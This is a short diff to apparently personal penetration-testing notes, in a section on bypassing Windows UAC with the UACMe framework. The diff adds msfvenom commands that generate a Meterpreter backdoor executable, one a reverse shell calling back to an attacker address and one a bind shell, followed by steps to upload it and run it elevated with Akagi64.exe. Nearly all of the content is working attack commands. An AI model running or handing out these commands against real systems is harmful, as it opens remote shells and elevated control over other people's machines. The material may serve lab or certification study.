@@ -113,7 +113,9 @@
 
 ##### 6.1.3 
     - Using the UACMe framework
-        - Generate backdoor : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
+        - Generate backdoor : 
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
+            msfvenom -p windows/meterpreter/bind_tcp RHOST=10.4.17.32 LPORT=4444 -f exe > backdoor.exe
         - Upload both backdoor.exe and UACMe executable
         - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
         
